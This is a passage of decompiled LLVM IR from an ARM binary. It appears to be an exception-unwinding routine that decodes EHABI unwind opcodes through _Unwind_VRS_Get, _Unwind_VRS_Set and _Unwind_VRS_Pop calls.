  %v0_1a160 = load i32, i32* @r5, align 4
  %v1_1a160 = add i32 %v0_1a160, 8
  %v2_1a160 = inttoptr i32 %v1_1a160 to i8*
  %v3_1a160 = load i8, i8* %v2_1a160, align 1
  %v4_1a160 = zext i8 %v3_1a160 to i32
  store i32 %v4_1a160, i32* %r3.global-to-local, align 4
  %v0_1a164 = load i32, i32* @r4, align 4
  %v1_1a164 = and i32 %v0_1a164, 32768
  %v2_1a164 = icmp eq i32 %v1_1a164, 0
  store i1 %v2_1a164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a164, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1a160
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a160, %bb147
  %v2_1a16c = icmp eq i8 %v3_1a160, 0
  store i1 %v2_1a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a16c, label %dec_label_pc_1a17c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1a170 = add nsw i32 %v4_1a160, -1
  store i32 %v2_1a170, i32* %r3.global-to-local, align 4
  %v2_1a174 = trunc i32 %v2_1a170 to i8
  store i8 %v2_1a174, i8* %v2_1a160, align 1
  %v0_1a178.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a178.pr.pr, label %.thread6.dec_label_pc_1a17c_crit_edge, label %dec_label_pc_1a0a8

.thread6.dec_label_pc_1a17c_crit_edge:            ; preds = %.thread6
  %v0_1a17c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a17c

dec_label_pc_1a17c:                               ; preds = %bb148, %.thread6.dec_label_pc_1a17c_crit_edge
  %v0_1a17c = phi i32 [ %v0_1a17c.pre, %.thread6.dec_label_pc_1a17c_crit_edge ], [ %v0_1a160, %bb148 ]
  %v1_1a17c = add i32 %v0_1a17c, 9
  %v2_1a17c = inttoptr i32 %v1_1a17c to i8*
  %v3_1a17c = load i8, i8* %v2_1a17c, align 1
  %v4_1a17c = zext i8 %v3_1a17c to i32
  store i32 %v4_1a17c, i32* %r3.global-to-local, align 4
  %v2_1a180 = icmp eq i8 %v3_1a17c, 0
  store i1 %v2_1a180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a180, label %dec_label_pc_1a188, label %dec_label_pc_1a08c

dec_label_pc_1a188:                               ; preds = %dec_label_pc_1a17c, %dec_label_pc_1a080, %dec_label_pc_1a0a8
  %v0_1a188 = load i32, i32* @sl, align 4
  %v2_1a188 = icmp eq i32 %v0_1a188, 0
  store i1 %v2_1a188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a188, label %dec_label_pc_1a250, label %bb149

bb149:                                            ; preds = %dec_label_pc_1a188
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a194

dec_label_pc_1a194:                               ; preds = %bb149, %dec_label_pc_1a704, %dec_label_pc_1a5a4, %dec_label_pc_1a3c8, %dec_label_pc_1a380, %dec_label_pc_1a33c, %dec_label_pc_1a250
  %v1_1a19c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1a704 ], [ 9, %dec_label_pc_1a5a4 ], [ 9, %dec_label_pc_1a3c8 ], [ 9, %dec_label_pc_1a380 ], [ 9, %dec_label_pc_1a33c ], [ %v0_1a284, %dec_label_pc_1a250 ]
  store i32 %v9_1a058, i32* %r6.global-to-local, align 4
  store i32 %v21_1a058, i32* @lr, align 4
  ret i32 %v1_1a19c

dec_label_pc_1a1a0:                               ; preds = %dec_label_pc_1a0c4
  %v1_1a1a0 = mul i32 %v0_1a0c4, 4
  %v3_1a1a4 = and i32 %v1_1a1a0, 252
  store i32 %v3_1a1a4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a1b0 = load i32, i32* @r7, align 4
  store i32 %v0_1a1b0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1a1b8 = add nuw nsw i32 %v3_1a1a4, 4
  store i32 %v1_1a1b8, i32* %r6.global-to-local, align 4
  %v5_1a1c0 = call i32 @_Unwind_VRS_Get(i32 %v0_1a1b0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1a1c4 = load i32, i32* @r4, align 4
  %v1_1a1c4 = and i32 %v0_1a1c4, 64
  %v2_1a1c4 = icmp eq i32 %v1_1a1c4, 0
  store i1 %v2_1a1c4, i1* %cpsr_z.global-to-local, align 1
  %v4_1a1cc = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1a1d8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1a1d8
  %storemerge160.p = select i1 %v2_1a1c4, i32 %v2_1a1d8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1a1cc
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1a1f4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a1f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a06c.backedge

dec_label_pc_1a06c.backedge:                      ; preds = %dec_label_pc_1a1a0, %dec_label_pc_1a21c, %dec_label_pc_1a6a0, %dec_label_pc_1a36c, %dec_label_pc_1a3a4, %dec_label_pc_1a324, %dec_label_pc_1a590
  %v0_1a06c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a06c

dec_label_pc_1a1fc:                               ; preds = %dec_label_pc_1a0cc
  %v7_1a1fc = icmp eq i32 %v1_1a0cc, 144
  store i1 %v7_1a1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1fc, label %dec_label_pc_1a204, label %dec_label_pc_1a344

dec_label_pc_1a204:                               ; preds = %dec_label_pc_1a1fc
  %v1_1a204 = urem i32 %v0_1a0c4, 16
  store i32 %v1_1a204, i32* %r2.global-to-local, align 4
  %v2_1a208 = icmp eq i32 %v1_1a204, 15
  store i1 %v2_1a208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a208, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a204
  %v8_1a20c = icmp eq i32 %v1_1a204, 13
  store i1 %v8_1a20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1a20c, label %bb154, label %dec_label_pc_1a21c

.thread21:                                        ; preds = %dec_label_pc_1a204
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a33c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a33c

dec_label_pc_1a21c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a228 = load i32, i32* @r7, align 4
  store i32 %v0_1a228, i32* %r0.global-to-local, align 4
  %v5_1a230 = call i32 @_Unwind_VRS_Get(i32 %v0_1a228, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a238 = load i32, i32* @r7, align 4
  store i32 %v0_1a238, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1a248 = call i32 @_Unwind_VRS_Set(i32 %v0_1a238, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a248, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a06c.backedge

dec_label_pc_1a250:                               ; preds = %dec_label_pc_1a188
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a260 = load i32, i32* @r7, align 4
  store i32 %v0_1a260, i32* %r0.global-to-local, align 4
  %v7_1a268 = call i32 @_Unwind_VRS_Get(i32 %v0_1a260, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1a26c = load i32, i32* @r7, align 4
  store i32 %v0_1a26c, i32* %r0.global-to-local, align 4
  %v0_1a270 = load i32, i32* @sl, align 4
  store i32 %v0_1a270, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1a270, i32* %r3.global-to-local, align 4
  %v5_1a280 = call i32 @_Unwind_VRS_Set(i32 %v0_1a26c, i32 %v0_1a270, i32 15, i32 %v0_1a270, i8* bitcast (i32* @0 to i8*))
  %v0_1a284 = load i32, i32* @sl, align 4
  store i32 %v0_1a284, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a194

dec_label_pc_1a28c:                               ; preds = %dec_label_pc_1a480
  %v7_1a28c = icmp eq i32 %v0_1a480, 199
  store i1 %v7_1a28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a28c, label %dec_label_pc_1a560, label %dec_label_pc_1a294

dec_label_pc_1a294:                               ; preds = %dec_label_pc_1a28c
  %v1_1a294 = and i32 %v0_1a0c4, 248
  store i32 %v1_1a294, i32* %r3.global-to-local, align 4
  %v7_1a298 = icmp eq i32 %v1_1a294, 192
  store i1 %v7_1a298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a298, label %.thread24, label %dec_label_pc_1a2b0

.thread24:                                        ; preds = %dec_label_pc_1a294
  %v2_1a29c = urem i32 %v0_1a0c4, 16
  %v2_1a2a0 = add nuw nsw i32 %v2_1a29c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1a2a8 = or i32 %v2_1a2a0, 655360
  store i32 %v2_1a2a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a2b0:                               ; preds = %dec_label_pc_1a294
  %v7_1a2b0 = icmp eq i32 %v0_1a480, 200
  store i1 %v7_1a2b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2b0, label %dec_label_pc_1a4f4, label %dec_label_pc_1a2b8

dec_label_pc_1a2b8:                               ; preds = %dec_label_pc_1a2b0
  %v7_1a2b8 = icmp eq i32 %v0_1a480, 201
  store i1 %v7_1a2b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2b8, label %dec_label_pc_1a2c0, label %dec_label_pc_1a33c

dec_label_pc_1a2c0:                               ; preds = %dec_label_pc_1a2b8
  %v0_1a2c0 = load i32, i32* @r5, align 4
  %v1_1a2c0 = add i32 %v0_1a2c0, 8
  %v2_1a2c0 = inttoptr i32 %v1_1a2c0 to i8*
  %v3_1a2c0 = load i8, i8* %v2_1a2c0, align 1
  %v4_1a2c0 = zext i8 %v3_1a2c0 to i32
  store i32 %v4_1a2c0, i32* %r3.global-to-local, align 4
  %v2_1a2c4 = icmp eq i8 %v3_1a2c0, 0
  store i1 %v2_1a2c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2c4, label %dec_label_pc_1a2d4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1a2c0
  %v2_1a2c8 = add nsw i32 %v4_1a2c0, -1
  store i32 %v2_1a2c8, i32* %r3.global-to-local, align 4
  %v2_1a2cc = trunc i32 %v2_1a2c8 to i8
  store i8 %v2_1a2cc, i8* %v2_1a2c0, align 1
  %v0_1a2d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2d0.pr.pr, label %.thread26.dec_label_pc_1a2d4_crit_edge, label %dec_label_pc_1a308

.thread26.dec_label_pc_1a2d4_crit_edge:           ; preds = %.thread26
  %v0_1a2d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a2d4

dec_label_pc_1a2d4:                               ; preds = %.thread26.dec_label_pc_1a2d4_crit_edge, %dec_label_pc_1a2c0
  %v2_1a2ec = phi i32 [ %v0_1a2d4.pre, %.thread26.dec_label_pc_1a2d4_crit_edge ], [ %v0_1a2c0, %dec_label_pc_1a2c0 ]
  %v1_1a2d4 = add i32 %v2_1a2ec, 9
  %v2_1a2d4 = inttoptr i32 %v1_1a2d4 to i8*
  %v3_1a2d4 = load i8, i8* %v2_1a2d4, align 1
  %v4_1a2d4 = zext i8 %v3_1a2d4 to i32
  store i32 %v4_1a2d4, i32* %r3.global-to-local, align 4
  %v2_1a2d8 = icmp eq i8 %v3_1a2d4, 0
  store i1 %v2_1a2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2d8, label %dec_label_pc_1a324, label %dec_label_pc_1a2e8

dec_label_pc_1a2e8:                               ; preds = %dec_label_pc_1a2d4
  %v1_1a2e8 = add nsw i32 %v4_1a2d4, -1
  store i32 %v1_1a2e8, i32* %r3.global-to-local, align 4
  %v1_1a2ec = trunc i32 %v1_1a2e8 to i8
  store i8 %v1_1a2ec, i8* %v2_1a2d4, align 1
  %v0_1a2f0 = load i32, i32* @r5, align 4
  %v1_1a2f0 = add i32 %v0_1a2f0, 4
  %v2_1a2f0 = inttoptr i32 %v1_1a2f0 to i32*
  %v3_1a2f0 = load i32, i32* %v2_1a2f0, align 4
  store i32 %v3_1a2f0, i32* %r2.global-to-local, align 4
  %v1_1a2f4 = inttoptr i32 %v3_1a2f0 to i32*
  %v2_1a2f4 = load i32, i32* %v1_1a2f4, align 4
  store i32 %v2_1a2f4, i32* %r0.global-to-local, align 4
  %v4_1a2f4 = add i32 %v3_1a2f0, 4
  store i32 %v4_1a2f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a2f4, i32* %v2_1a2f0, align 4
  %v0_1a300 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a300 = trunc i32 %v0_1a300 to i8
  %v2_1a300 = load i32, i32* @r5, align 4
  %v3_1a300 = add i32 %v2_1a300, 8
  %v4_1a300 = inttoptr i32 %v3_1a300 to i8*
  store i8 %v1_1a300, i8* %v4_1a300, align 1
  %v0_1a304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a304 = load i32, i32* @r5, align 4
  %v2_1a304 = inttoptr i32 %v1_1a304 to i32*
  store i32 %v0_1a304, i32* %v2_1a304, align 4
  br label %dec_label_pc_1a308

dec_label_pc_1a308:                               ; preds = %.thread26, %dec_label_pc_1a2e8
  %v0_1a308 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a308 = udiv i32 %v0_1a308, 16777216
  %v1_1a30c = urem i32 %v3_1a308, 16
  %v3_1a310 = mul i32 %v0_1a308, 256
  %v1_1a314 = add nuw nsw i32 %v1_1a30c, 1
  store i32 %v1_1a314, i32* %r1.global-to-local, align 4
  %v1_1a318 = and i32 %v3_1a308, 240
  store i32 %v1_1a318, i32* %r3.global-to-local, align 4
  %v1_1a31c = load i32, i32* @r5, align 4
  %v2_1a31c = inttoptr i32 %v1_1a31c to i32*
  store i32 %v3_1a310, i32* %v2_1a31c, align 4
  %v0_1a320 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a320 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a320 = mul i32 %v1_1a320, 4096
  %v5_1a320 = or i32 %v4_1a320, %v0_1a320
  br label %dec_label_pc_1a324

dec_label_pc_1a324:                               ; preds = %dec_label_pc_1a2d4, %dec_label_pc_1a308
  %storemerge = phi i32 [ %v5_1a320, %dec_label_pc_1a308 ], [ 720897, %dec_label_pc_1a2d4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1a324 = load i32, i32* @r7, align 4
  store i32 %v0_1a324, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a330 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a324, i32 1, i32 5, i32 5)
  store i32 %v4_1a330, i32* %r0.global-to-local, align 4
  %v2_1a334 = icmp eq i32 %v4_1a330, 0
  store i1 %v2_1a334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a334, label %dec_label_pc_1a06c.backedge, label %dec_label_pc_1a33c

dec_label_pc_1a33c:                               ; preds = %dec_label_pc_1a588, %dec_label_pc_1a2b8, %dec_label_pc_1a398, %dec_label_pc_1a73c, %dec_label_pc_1a70c, %dec_label_pc_1a6e8, %dec_label_pc_1a574, %dec_label_pc_1a324, %dec_label_pc_1a138, %dec_label_pc_1a12c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a194

dec_label_pc_1a344:                               ; preds = %dec_label_pc_1a1fc
  %v7_1a344 = icmp eq i32 %v1_1a0cc, 160
  store i1 %v7_1a344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a344, label %dec_label_pc_1a34c, label %dec_label_pc_1a388

dec_label_pc_1a34c:                               ; preds = %dec_label_pc_1a344
  %v0_1a34c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a34c = urem i32 %v0_1a34c, 8
  %v1_1a350 = xor i32 %v1_1a34c, 7
  store i32 %v1_1a350, i32* %r3.global-to-local, align 4
  %v6_1a358 = lshr i32 4080, %v1_1a350
  %v1_1a35c = and i32 %v0_1a0c4, 8
  %v2_1a35c = icmp eq i32 %v1_1a35c, 0
  store i1 %v2_1a35c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a360 = and i32 %v6_1a358, 4080
  %tmp155 = mul nuw nsw i32 %v1_1a35c, 2048
  %tmp156 = or i32 %v1_1a360, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a36c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1a6fc.dec_label_pc_1a36c_crit_edge, %bb157, %dec_label_pc_1a558, %dec_label_pc_1a4ec, %dec_label_pc_1a44c, %dec_label_pc_1a34c
  %v2_1a374 = phi i32 [ %v2_1a470, %.thread44 ], [ %v2_1a478, %bb157 ], [ %v2_1a374.pre, %dec_label_pc_1a6fc.dec_label_pc_1a36c_crit_edge ], [ %v2_1a2a8, %.thread24 ], [ %storemerge130, %dec_label_pc_1a558 ], [ %storemerge131, %dec_label_pc_1a4ec ], [ %storemerge132, %dec_label_pc_1a44c ], [ %tmp156, %dec_label_pc_1a34c ]
  %v0_1a370 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1a6fc.dec_label_pc_1a36c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1a558 ], [ 3, %dec_label_pc_1a4ec ], [ 1, %dec_label_pc_1a44c ], [ 0, %dec_label_pc_1a34c ]
  %v0_1a36c = load i32, i32* @r7, align 4
  store i32 %v0_1a36c, i32* %r0.global-to-local, align 4
  store i32 %v0_1a370, i32* %r3.global-to-local, align 4
  %v4_1a374 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a36c, i32 %v0_1a370, i32 %v2_1a374, i32 %v0_1a370)
  store i32 %v4_1a374, i32* %r0.global-to-local, align 4
  %v2_1a378 = icmp eq i32 %v4_1a374, 0
  store i1 %v2_1a378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a378, label %dec_label_pc_1a06c.backedge, label %dec_label_pc_1a380

dec_label_pc_1a380:                               ; preds = %dec_label_pc_1a36c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a194

dec_label_pc_1a388:                               ; preds = %dec_label_pc_1a344
  %v7_1a388 = icmp eq i32 %v1_1a0cc, 176
  store i1 %v7_1a388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a388, label %dec_label_pc_1a3d0, label %dec_label_pc_1a390

dec_label_pc_1a390:                               ; preds = %dec_label_pc_1a388
  %v7_1a390 = icmp eq i32 %v1_1a0cc, 192
  store i1 %v7_1a390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a390, label %dec_label_pc_1a480, label %dec_label_pc_1a398

dec_label_pc_1a398:                               ; preds = %dec_label_pc_1a390
  %v1_1a398 = and i32 %v0_1a0c4, 248
  store i32 %v1_1a398, i32* %r3.global-to-local, align 4
  %v7_1a39c = icmp eq i32 %v1_1a398, 208
  store i1 %v7_1a39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a39c, label %dec_label_pc_1a3a4, label %dec_label_pc_1a33c

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a398
  %v1_1a3a4 = urem i32 %v0_1a0c4, 8
  %v1_1a3a8 = add nuw nsw i32 %v1_1a3a4, 1
  %v1_1a3ac = or i32 %v1_1a3a8, 524288
  store i32 %v1_1a3ac, i32* %r2.global-to-local, align 4
  %v0_1a3b0 = load i32, i32* @r7, align 4
  store i32 %v0_1a3b0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a3bc = call i32 @_Unwind_VRS_Pop(i32 %v0_1a3b0, i32 1, i32 %v1_1a3ac, i32 5)
  store i32 %v4_1a3bc, i32* %r0.global-to-local, align 4
  %v2_1a3c0 = icmp eq i32 %v4_1a3bc, 0
  store i1 %v2_1a3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3c0, label %dec_label_pc_1a06c.backedge, label %dec_label_pc_1a3c8

dec_label_pc_1a3c8:                               ; preds = %dec_label_pc_1a3a4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a194

dec_label_pc_1a3d0:                               ; preds = %dec_label_pc_1a388
  %v0_1a3d0 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a3d0 = icmp eq i32 %v0_1a3d0, 177
  store i1 %v7_1a3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3d0, label %dec_label_pc_1a6d4, label %dec_label_pc_1a3d8

dec_label_pc_1a3d8:                               ; preds = %dec_label_pc_1a3d0
  %v7_1a3d8 = icmp eq i32 %v0_1a3d0, 178
  store i1 %v7_1a3d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3d8, label %dec_label_pc_1a5ac, label %dec_label_pc_1a3e0

dec_label_pc_1a3e0:                               ; preds = %dec_label_pc_1a3d8
  %v7_1a3e0 = icmp eq i32 %v0_1a3d0, 179
  store i1 %v7_1a3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3e0, label %dec_label_pc_1a3e8, label %dec_label_pc_1a454

dec_label_pc_1a3e8:                               ; preds = %dec_label_pc_1a3e0
  %v0_1a3e8 = load i32, i32* @r5, align 4
  %v1_1a3e8 = add i32 %v0_1a3e8, 8
  %v2_1a3e8 = inttoptr i32 %v1_1a3e8 to i8*
  %v3_1a3e8 = load i8, i8* %v2_1a3e8, align 1
  %v4_1a3e8 = zext i8 %v3_1a3e8 to i32
  store i32 %v4_1a3e8, i32* %r3.global-to-local, align 4
  %v2_1a3ec = icmp eq i8 %v3_1a3e8, 0
  store i1 %v2_1a3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3ec, label %dec_label_pc_1a3fc, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1a3e8
  %v2_1a3f0 = add nsw i32 %v4_1a3e8, -1
  store i32 %v2_1a3f0, i32* %r3.global-to-local, align 4
  %v2_1a3f4 = trunc i32 %v2_1a3f0 to i8
  store i8 %v2_1a3f4, i8* %v2_1a3e8, align 1
  %v0_1a3f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a3f8.pr.pr, label %.thread30.dec_label_pc_1a3fc_crit_edge, label %dec_label_pc_1a430

.thread30.dec_label_pc_1a3fc_crit_edge:           ; preds = %.thread30
  %v0_1a3fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a3fc

dec_label_pc_1a3fc:                               ; preds = %.thread30.dec_label_pc_1a3fc_crit_edge, %dec_label_pc_1a3e8
  %v2_1a414 = phi i32 [ %v0_1a3fc.pre, %.thread30.dec_label_pc_1a3fc_crit_edge ], [ %v0_1a3e8, %dec_label_pc_1a3e8 ]
  %v1_1a3fc = add i32 %v2_1a414, 9
  %v2_1a3fc = inttoptr i32 %v1_1a3fc to i8*
  %v3_1a3fc = load i8, i8* %v2_1a3fc, align 1
  %v4_1a3fc = zext i8 %v3_1a3fc to i32
  store i32 %v4_1a3fc, i32* %r3.global-to-local, align 4
  %v2_1a400 = icmp eq i8 %v3_1a3fc, 0
  store i1 %v2_1a400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a400, label %dec_label_pc_1a44c, label %dec_label_pc_1a410

dec_label_pc_1a410:                               ; preds = %dec_label_pc_1a3fc
  %v1_1a410 = add nsw i32 %v4_1a3fc, -1
  store i32 %v1_1a410, i32* %r3.global-to-local, align 4
  %v1_1a414 = trunc i32 %v1_1a410 to i8
  store i8 %v1_1a414, i8* %v2_1a3fc, align 1
  %v0_1a418 = load i32, i32* @r5, align 4
  %v1_1a418 = add i32 %v0_1a418, 4
  %v2_1a418 = inttoptr i32 %v1_1a418 to i32*
  %v3_1a418 = load i32, i32* %v2_1a418, align 4
  store i32 %v3_1a418, i32* %r2.global-to-local, align 4
  %v1_1a41c = inttoptr i32 %v3_1a418 to i32*
  %v2_1a41c = load i32, i32* %v1_1a41c, align 4
  store i32 %v2_1a41c, i32* %r0.global-to-local, align 4
  %v4_1a41c = add i32 %v3_1a418, 4
  store i32 %v4_1a41c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a41c, i32* %v2_1a418, align 4
  %v0_1a428 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a428 = trunc i32 %v0_1a428 to i8
  %v2_1a428 = load i32, i32* @r5, align 4
  %v3_1a428 = add i32 %v2_1a428, 8
  %v4_1a428 = inttoptr i32 %v3_1a428 to i8*
  store i8 %v1_1a428, i8* %v4_1a428, align 1
  %v0_1a42c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a42c = load i32, i32* @r5, align 4
  %v2_1a42c = inttoptr i32 %v1_1a42c to i32*
  store i32 %v0_1a42c, i32* %v2_1a42c, align 4
  br label %dec_label_pc_1a430

dec_label_pc_1a430:                               ; preds = %.thread30, %dec_label_pc_1a410
  %v0_1a430 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a430 = udiv i32 %v0_1a430, 16777216
  %v1_1a434 = urem i32 %v3_1a430, 16
  %v3_1a438 = mul i32 %v0_1a430, 256
  store i32 %v3_1a438, i32* %r0.global-to-local, align 4
  %v1_1a43c = add nuw nsw i32 %v1_1a434, 1
  store i32 %v1_1a43c, i32* %r2.global-to-local, align 4
  %v1_1a440 = and i32 %v3_1a430, 240
  store i32 %v1_1a440, i32* %r3.global-to-local, align 4
  %v1_1a444 = load i32, i32* @r5, align 4
  %v2_1a444 = inttoptr i32 %v1_1a444 to i32*
  store i32 %v3_1a438, i32* %v2_1a444, align 4
  %v0_1a448 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a448 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a448 = mul i32 %v1_1a448, 4096
  %v5_1a448 = or i32 %v4_1a448, %v0_1a448
  br label %dec_label_pc_1a44c

dec_label_pc_1a44c:                               ; preds = %dec_label_pc_1a3fc, %dec_label_pc_1a430
  %storemerge132 = phi i32 [ %v5_1a448, %dec_label_pc_1a430 ], [ 720897, %dec_label_pc_1a3fc ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a454:                               ; preds = %dec_label_pc_1a3e0
  %v1_1a454 = and i32 %v0_1a0c4, 252
  store i32 %v1_1a454, i32* %r3.global-to-local, align 4
  %v7_1a458 = icmp eq i32 %v1_1a454, 180
  store i1 %v7_1a458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a458, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1a454
  %v2_1a45c = urem i32 %v0_1a0c4, 4
  %v2_1a464 = add nuw nsw i32 %v2_1a45c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1a470 = or i32 %v2_1a464, 262144
  store i32 %v2_1a470, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a36c

bb157:                                            ; preds = %dec_label_pc_1a454
  %v2_1a460 = urem i32 %v0_1a3d0, 8
  %v2_1a468 = add nuw nsw i32 %v2_1a460, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1a478 = or i32 %v2_1a468, 524288
  store i32 %v2_1a478, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a480:                               ; preds = %dec_label_pc_1a390
  %v0_1a480 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a480 = icmp eq i32 %v0_1a480, 198
  store i1 %v7_1a480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a480, label %dec_label_pc_1a488, label %dec_label_pc_1a28c

dec_label_pc_1a488:                               ; preds = %dec_label_pc_1a480
  %v0_1a488 = load i32, i32* @r5, align 4
  %v1_1a488 = add i32 %v0_1a488, 8
  %v2_1a488 = inttoptr i32 %v1_1a488 to i8*
  %v3_1a488 = load i8, i8* %v2_1a488, align 1
  %v4_1a488 = zext i8 %v3_1a488 to i32
  store i32 %v4_1a488, i32* %r3.global-to-local, align 4
  %v2_1a48c = icmp eq i8 %v3_1a488, 0
  store i1 %v2_1a48c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a48c, label %dec_label_pc_1a49c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1a488
  %v2_1a490 = add nsw i32 %v4_1a488, -1
